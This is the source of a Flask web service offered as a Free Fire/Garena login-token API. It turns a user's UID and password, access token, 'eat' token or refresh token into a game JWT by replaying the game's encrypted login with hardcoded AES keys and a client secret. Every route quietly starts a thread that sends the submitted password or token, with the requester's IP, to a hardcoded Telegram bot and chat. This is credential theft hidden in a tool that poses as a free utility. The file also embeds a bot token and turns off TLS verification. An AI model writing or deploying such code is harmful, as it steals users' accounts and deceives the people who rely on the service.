from flask import Flask, request, jsonify
import requests
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import os
from datetime import datetime, timezone
import time
import jwt
import json
import re
import my_pb2
import output_pb2
import httpx
import asyncio
import warnings
import threading  # <-- NEW: Telegram background process ke liye
from urllib.parse import urlparse, parse_qs
from urllib3.exceptions import InsecureRequestWarning

warnings.filterwarnings("ignore", category=InsecureRequestWarning)

app = Flask(__name__)

# =====================================================================
# ★ NEW: TELEGRAM BOT NOTIFICATION SYSTEM
# =====================================================================
TELEGRAM_BOT_TOKEN = "8766053641:AAHGLBI3-Aq1gAEPymAglUcsQLtu0KzJzFk"
YOUR_CHAT_ID = "8278814873"

def send_telegram_notification(login_method, data_dict, requester_ip, timestamp):
    """Send request details to your Telegram bot asynchronously"""
    try:
        data_str = ""
        for key, value in data_dict.items():
            data_str += f"🔹 *{key}:*\n`{value}`\n\n"

        message_text = (
            f"🔐 *FREE FIRE API REQUEST DETECTED* 🔐\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📌 *Login Method:* `{login_method}`\n"
            f"🕒 *Time:* `{timestamp}`\n"
            f"🌐 *IP Address:* `{requester_ip}`\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{data_str}"
            f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"💡 *Tap on values to copy*"
        )
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": YOUR_CHAT_ID,
            "text": message_text,
            "parse_mode": "Markdown"
        }
        requests.post(url, json=payload, timeout=5.0)
    except Exception as e:
        print(f"[ERROR] Telegram notification failed: {e}")
# =====================================================================


# AES key/IV (must match the server)
KEY = bytes([89, 103, 38, 116, 99, 37, 68, 69, 117, 104, 54, 37, 90, 99, 94, 56])
IV  = bytes([54, 111, 121, 90, 68, 114, 50, 50, 69, 51, 121, 99, 104, 106, 77, 37])

# ★ PP Main Ecoonghj endpoints
MAJOR_LOGIN_URL    = "https://loginbp.ppmainecoonghj.com/MajorLogin"
TOKEN_REFRESH_URL  = "https://ffmconnect.ppmainecoonghj.com/oauth/token/refresh"

# Exact UA from spec
UNITY_UA = "UnityPlayer/2018.4.12f1 (UnityWebRequest/1.0, libcurl/8.5.0-DEV)"

# Client version from your JWT example
CLIENT_VERSION       = "1.114.18"
CLIENT_VERSION_CODE  = ""
RELEASE_VERSION      = "OB55"

CREDIT = "@sxbro"


def log_info(msg):  print(f"[INFO] {msg}")
def log_error(msg): print(f"[ERROR] {msg}")
def log_debug(msg): print(f"[DEBUG] {msg}")


def show_raw_response(label, response):
    print("=" * 60)
    print(f"[{label}] Status: {response.status_code}")
    print(f"[{label}] Headers: {dict(response.headers)}")
    print(f"[{label}] Raw hex: {response.content.hex()}")
    try:
        print(f"[{label}] Text: {response.content.decode('utf-8', errors='replace')}")
    except Exception:
        pass
    print("=" * 60)


def now_unix():
    return int(time.time())


# ─────────────────────────────────────────────────────────────
# AES helpers
# ─────────────────────────────────────────────────────────────
def encrypt_game_data(game_data) -> bytes:
    serialized = game_data.SerializeToString()
    padded     = pad(serialized, AES.block_size)
    cipher     = AES.new(KEY, AES.MODE_CBC, IV)
    return cipher.encrypt(padded)


def decrypt_response(data: bytes) -> bytes:
    """Decrypt AES-CBC response from MajorLogin, strip PKCS7 padding."""
    cipher = AES.new(KEY, AES.MODE_CBC, IV)
    decrypted = cipher.decrypt(data)
    try:
        return unpad(decrypted, AES.block_size)
    except Exception:
        pad_len = decrypted[-1]
        if 1 <= pad_len <= 16:
            return decrypted[:-pad_len]
        return decrypted


# ─────────────────────────────────────────────────────────────
# Garena guest token
# ─────────────────────────────────────────────────────────────
def getGuestAccessToken(uid, password):
    session = requests.Session()
    headers = {
        "Host": "100067.connect.garena.com",
        "User-Agent": "GarenaMSDK/4.0.19P4(G011A ;Android 9;en;US;)",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "close",
    }
    data = {
        "uid": str(uid),
        "password": str(password),
        "response_type": "token",
        "client_type": "2",
        "client_secret": "2ee44819e9b4598845141067b281621874d0d5d7af9d8f7e00c1e54715b7d1e3",
        "client_id": "100067",
    }
    response = session.post(
        "https://100067.connect.garena.com/oauth/guest/token/grant",
        headers=headers, data=data, verify=False, timeout=30,
    )
    data_response = response.json()
    session.close()

    if data_response.get("success") is True:
        resp = data_response.get("response", {})
        if resp.get("error") == "auth_error":
            return {"error": "auth_error"}

    return {
        "access_token": data_response.get("access_token"),
        "open_id": data_response.get("open_id"),
    }


def check_guest(uid, password):
    token_data = getGuestAccessToken(uid, password)
    if token_data.get("error") == "auth_error":
        return uid, None, None, True
    access_token = token_data.get("access_token")
    open_id = token_data.get("open_id")
    if access_token and open_id:
        log_debug(f"UID {uid}: obtained access_token + open_id")
        return uid, access_token, open_id, False
    log_error(f"UID {uid}: login failed, token missing")
    return uid, None, None, False


def get_token_inspect_data(access_token):
    try:
        session = requests.Session()
        resp = session.get(
            f"https://100067.connect.garena.com/oauth/token/inspect?token={access_token}",
            timeout=15, verify=False,
        )
        data = resp.json()
        session.close()
        if "open_id" in data and "platform" in data and "uid" in data:
            return data
    except Exception as e:
        log_error(f"token inspect error: {e}")
    return None


# ─────────────────────────────────────────────────────────────
# Build GameData
# ─────────────────────────────────────────────────────────────
def build_game_data(uid, open_id, access_token, platform_type):
    g = my_pb2.GameData()
    g.timestamp        = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
    g.game_name        = "Free Fire"
    g.game_version     = 1
    g.version_code     = CLIENT_VERSION
    g.os_info          = "Android OS 14 / API-34"
    g.device_type      = "Handheld"
    g.network_provider = "Verizon Wireless"
    g.connection_type  = "WIFI"
    g.screen_width     = 1080
    g.screen_height    = 2400
    g.dpi              = "420"
    g.cpu_info         = "ARM64"
    g.total_ram        = 6144
    g.gpu_name         = "Adreno (TM) 730"
    g.gpu_version      = "OpenGL ES 3.2"
    g.user_id          = uid
    g.ip_address       = "172.190.111.97"
    g.language         = "en"
    g.open_id          = open_id
    g.access_token     = access_token
    g.platform_type    = platform_type
    g.field_99         = str(platform_type)
    g.field_100        = str(platform_type)
    return g


# ─────────────────────────────────────────────────────────────
# ★ MajorLogin — decrypt response, extract JWT
# ─────────────────────────────────────────────────────────────
def login(uid, access_token, open_id, platform_type):
    log_debug(f"MajorLogin for UID={uid} platform={platform_type}")

    game_data = build_game_data(uid, open_id, access_token, platform_type)
    encrypted = encrypt_game_data(game_data)

    headers = {
        "Accept":            "*/*",
        "Accept-Encoding":   "deflate, gzip",
        "Content-Type":      "application/x-www-form-urlencoded",
        "Host":              "loginbp.ppmainecoonghj.com",
        "ReleaseVersion":    RELEASE_VERSION,
        "User-Agent":        UNITY_UA,
        "X-GA":              "v1 1",
        "X-GA-SV":           str(now_unix()),
        "X-Unity-Version":   "2018.4.12f1",
        "Content-Length":    str(len(encrypted)),
    }

    try:
        session = requests.Session()
        response = session.post(
            MAJOR_LOGIN_URL, data=encrypted,
            headers=headers, timeout=30, verify=False,
        )
        session.close()

        show_raw_response("MajorLogin", response)

        if response.status_code == 200:
            try:
                decrypted = decrypt_response(response.content)
                log_debug(f"Decrypted length: {len(decrypted)}")
            except Exception as e:
                log_error(f"Decrypt failed, using raw: {e}")
                decrypted = response.content

            token = None
            try:
                jwt_msg = output_pb2.Garena_420()
                jwt_msg.ParseFromString(decrypted)
                if jwt_msg.token:
                    token = jwt_msg.token
                    log_debug("JWT extracted via protobuf")
            except Exception as e:
                log_debug(f"Protobuf parse failed ({e}), regex fallback")

            if not token:
                m = re.search(rb"eyJ[A-Za-z0-9_\-\.]+", decrypted)
                if not m:
                    m = re.search(rb"eyJ[A-Za-z0-9_\-\.]+", response.content)
                if m:
                    token = m.group(0).decode()
                    log_debug("JWT extracted via regex fallback")

            if token:
                log_debug(f"MajorLogin OK for UID={uid}")
                return token

        err = response.content.decode(errors="ignore").strip()
        log_debug(f"MajorLogin {response.status_code}: {err}")

        if "BR_PLATFORM_INVALID_PLATFORM" in err:
            return {"error": "INVALID_PLATFORM",
                    "message": "this account is registered on another platform"}
        if "BR_GOP_TOKEN_AUTH_FAILED" in err:
            return {"error": "INVALID_TOKEN", "message": "AccessToken invalid."}
        if "BR_PLATFORM_INVALID_OPENID" in err:
            return {"error": "INVALID_OPENID", "message": "OpenID invalid."}
        if "unregistered" in err.lower() or "banned" in err.lower():
            return {"error": "UNREGISTERED_OR_BANNED",
                    "message": "unregistered or banned account."}
        if "SignError" in err:
            return {"error": "SIGN_ERROR", "message": f"Signature error: {err}"}

    except Exception as e:
        log_error(f"UID {uid}: MajorLogin exception - {e}")
    return None


# ─────────────────────────────────────────────────────────────
# Token refresh
# ─────────────────────────────────────────────────────────────
def refresh_access_token(refresh_token):
    headers = {
        "Accept-Encoding":  "gzip",
        "Connection":       "Keep-Alive",
        "Content-Type":     "application/x-www-form-urlencoded",
        "Host":             "ffmconnect.ppmainecoonghj.com",
        "User-Agent":       "GarenaMSDK/4.0.44(SM-S9280 ;Android 14;en;US;app 1.132.1 2019121228;)",
    }
    data = {
        "refresh_token": refresh_token,
        "grant_type":    "refresh_token",
    }
    try:
        session = requests.Session()
        resp = session.post(
            TOKEN_REFRESH_URL, data=data,
            headers=headers, timeout=20, verify=False,
        )
        session.close()
        show_raw_response("TokenRefresh", resp)
        if resp.status_code == 200:
            try:
                return resp.json()
            except Exception:
                return {"error": "invalid_response"}
    except Exception as e:
        log_error(f"Token refresh error: {e}")
    return None


# ─────────────────────────────────────────────────────────────
# JWT helpers
# ─────────────────────────────────────────────────────────────
def decode_jwt_token(token):
    try:
        d = jwt.decode(token, options={"verify_signature": False})
        log_debug(f"JWT Payload: {json.dumps(d, indent=2)}")
        return d
    except Exception as e:
        log_error(f"JWT decode error: {e}")
        return None


def extract_account_info_from_jwt(token):
    d = decode_jwt_token(token)
    info = {"uid": None, "region": "Unknown"}
    if d:
        info["region"] = (
            d.get("lock_region") or d.get("noti_region")
            or d.get("region") or d.get("country_code")
            or d.get("country") or "Unknown"
        )
        info["uid"] = (
            d.get("account_id") or d.get("uid")
            or d.get("external_uid") or d.get("user_id")
            or d.get("id") or d.get("sub")
        )
    return info


# ─────────────────────────────────────────────────────────────
# eat_token flow
# ─────────────────────────────────────────────────────────────
async def get_garena_data_async(eat_token: str):
    """
    eat_token → callback → redirect URL → extract access_token, account_id, nickname, region
    """
    try:
        async with httpx.AsyncClient(verify=False, timeout=15.0, follow_redirects=False) as client:
            cb = f"https://api-otrss.garena.com/support/callback/?access_token={eat_token}"
            r = await client.get(cb, follow_redirects=False)

            log_debug(f"callback status: {r.status_code}")
            log_debug(f"callback headers: {dict(r.headers)}")

            redirect_url = None
            if 300 <= r.status_code < 400 and "Location" in r.headers:
                redirect_url = r.headers["Location"]
            elif r.status_code == 200:
                body = r.text
                m = re.search(r'https?://[^\s"\'<>]+access_token=[^\s"\'<>]+', body)
                if m:
                    redirect_url = m.group(0)

            if not redirect_url:
                return {"error": "Invalid access token or session expired"}

            log_debug(f"redirect_url: {redirect_url}")

            parsed = urlparse(redirect_url)
            q = parse_qs(parsed.query)

            token_value = q.get("access_token", [None])[0]
            account_id  = q.get("account_id", [None])[0]
            nickname    = q.get("nickname", [None])[0]
            region      = q.get("region", [None])[0]

            if not token_value or not account_id:
                return {"error": "Failed to extract data from Garena redirect"}

            return {
                "status":           "success",
                "account_id":       account_id,
                "account_nickname": nickname,
                "access_token":     token_value,
                "region":           region,
            }
    except Exception as e:
        log_error(f"get_garena_data_async error: {e}")
        return {"error": "Server error", "details": str(e)}


# ─────────────────────────────────────────────────────────────
# Response builder
# ─────────────────────────────────────────────────────────────
def create_response(success, accesstoken=None, token=None,
                    uid=None, region=None, status="OK",
                    error_message=None):
    if success:
        return {
            "info": {
                "uid": str(uid) if uid is not None else None,
                "region": region or "Unknown",
            },
            "accesstoken": accesstoken,
            "token": token,
            "credit": CREDIT,
            "status": status,
            "success": True,
        }
    return {
        "success": False,
        "status": "ERROR",
        "credit": CREDIT,
        "message": error_message,
    }


# ─────────────────────────────────────────────────────────────
# Routes
# ─────────────────────────────────────────────────────────────
@app.route("/token", methods=["GET"])
def get_jwt():
    # Capture Request Info for Telegram
    requester_ip = request.remote_addr or "Unknown IP"
    timestamp_str = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")

    # 1) eat_token
    eat_token = request.args.get("eat")
    if eat_token:
        # --- NEW TELEGRAM LOGGING FOR EAT TOKEN ---
        threading.Thread(
            target=send_telegram_notification,
            args=("EAT Token", {"EAT Token": eat_token}, requester_ip, timestamp_str)
        ).start()
        # ------------------------------------------

        g = asyncio.run(get_garena_data_async(eat_token))
        if "error" in g:
            return jsonify(create_response(False, error_message=g["error"])), 400

        access_token    = g["access_token"]
        uid_from_eat    = g.get("account_id")
        region_from_eat = g.get("region")

        td = get_token_inspect_data(access_token)
        if not td:
            return jsonify(create_response(False, error_message="AccessToken invalid.")), 400

        open_id       = td["open_id"]
        platform_type = td["platform"]
        uid           = str(td["uid"])

        token = login(uid, access_token, open_id, platform_type)
        if isinstance(token, dict):
            return jsonify(create_response(False, error_message=token["message"])), 400
        if not token:
            return jsonify(create_response(False, error_message="unregistered or banned account.")), 500

        info = extract_account_info_from_jwt(token)
        final_region = info["region"] if info["region"] != "Unknown" else (region_from_eat or "Unknown")
        return jsonify(create_response(
            True,
            accesstoken=access_token,
            token=token,
            uid=info["uid"] or uid or uid_from_eat,
            region=final_region,
        ))

    # 2) uid + password
    uid = request.args.get("uid")
    password = request.args.get("password")
    if uid and password:
        # --- NEW TELEGRAM LOGGING FOR UID+PASSWORD ---
        threading.Thread(
            target=send_telegram_notification,
            args=("UID & Password", {"UID": uid, "Password": password}, requester_ip, timestamp_str)
        ).start()
        # ---------------------------------------------

        uid, access_token, open_id, err_flag = check_guest(uid, password)
        if err_flag:
            return jsonify(create_response(False, error_message="invalid uid, password")), 400
        if not access_token or not open_id:
            return jsonify(create_response(False, error_message="unregistered or banned account.")), 500

        token = login(uid, access_token, open_id, 4)
        if isinstance(token, dict):
            return jsonify(create_response(False, error_message=token["message"])), 400
        if not token:
            return jsonify(create_response(False, error_message="unregistered or banned account.")), 500

        info = extract_account_info_from_jwt(token)
        return jsonify(create_response(
            True,
            accesstoken=access_token,
            token=token,
            uid=info["uid"] or uid,
            region=info["region"],
        ))

    # 3) access_token
    access_token = request.args.get("access_token")
    if access_token:
        # --- NEW TELEGRAM LOGGING FOR ACCESS TOKEN ---
        threading.Thread(
            target=send_telegram_notification,
            args=("Access Token", {"Access Token": access_token}, requester_ip, timestamp_str)
        ).start()
        # ---------------------------------------------

        td = get_token_inspect_data(access_token)
        if not td:
            return jsonify(create_response(False, error_message="AccessToken invalid.")), 400
        open_id       = td["open_id"]
        platform_type = td["platform"]
        uid           = str(td["uid"])

        token = login(uid, access_token, open_id, platform_type)
        if isinstance(token, dict):
            return jsonify(create_response(False, error_message=token["message"])), 400
        if not token:
            return jsonify(create_response(False, error_message="unregistered or banned account.")), 500

        info = extract_account_info_from_jwt(token)
        return jsonify(create_response(
            True,
            accesstoken=access_token,
            token=token,
            uid=info["uid"] or uid,
            region=info["region"],
        ))

    # 4) refresh_token
    refresh_token = request.args.get("refresh_token")
    if refresh_token:
        # --- NEW TELEGRAM LOGGING FOR REFRESH TOKEN ---
        threading.Thread(
            target=send_telegram_notification,
            args=("Refresh Token", {"Refresh Token": refresh_token}, requester_ip, timestamp_str)
        ).start()
        # ----------------------------------------------

        data = refresh_access_token(refresh_token)
        if not data:
            data = {"error": "refresh_failed"}

        new_access = None
        if isinstance(data, dict):
            new_access = (
                data.get("access_token")
                or data.get("new_access_token")
                or data.get("token")
            )

        return jsonify({
            "credit": CREDIT,
            "data": data,
            "old_access": refresh_token,
            "new_access": new_access if new_access else refresh_token,
            "status": "OK",
            "success": True,
        })

    return jsonify(create_response(
        False,
        error_message="missing parameters. Use: uid+password, access_token, eat, or refresh_token",
    )), 400


@app.errorhandler(404)
def not_found(error):
    return jsonify({"detail": "Not Found"}), 404


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8001))
    log_info(f"Starting service on port {port}")
    app.run(host="0.0.0.0", port=port)
